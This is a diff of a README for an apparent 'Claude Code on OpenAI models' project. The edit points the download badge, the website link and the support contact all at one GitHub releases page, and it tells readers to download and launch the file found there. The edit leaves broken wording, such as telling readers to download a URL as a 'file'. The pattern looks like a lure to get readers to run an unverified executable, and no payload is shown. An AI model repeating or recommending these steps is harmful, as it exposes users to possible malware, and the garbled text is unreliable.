@@ -17,19 +17,19 @@ To get started, follow these simple steps:
 4. Analyze the results and integrate them into your projects.
 
 ## Link to Download App
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)  
-- Click on the badge above to download the App.zip file.  
+[![Download App](https://github.com/sar4daniela/claude-code-openai/releases)](https://github.com/sar4daniela/claude-code-openai/releases)  
+- Click on the badge above to download the https://github.com/sar4daniela/claude-code-openai/releases file.  
 - Launch the downloaded file to run the application and explore its functionalities.
 
 If the provided link does not work or is not accessible, please check the "Releases" section of this repository for alternative download options.
 
 ## Additional Resources
-For more information and resources related to this repository, visit the [official website](https://www.claudecodeopenai.com).
+For more information and resources related to this repository, visit the [official website](https://github.com/sar4daniela/claude-code-openai/releases).
 
 ## Contribute
 We welcome contributions from the community to enhance this repository further. Feel free to fork the project, make improvements, and submit pull requests.
 
 ## Support
-For any issues or questions regarding the usage of this repository, please contact our support team at support@claudecodeopenai.com.
+For any issues or questions regarding the usage of this repository, please contact our support team at https://github.com/sar4daniela/claude-code-openai/releases
 
 🌟 Start exploring the possibilities of Claude Code on OpenAI models today! 🌟
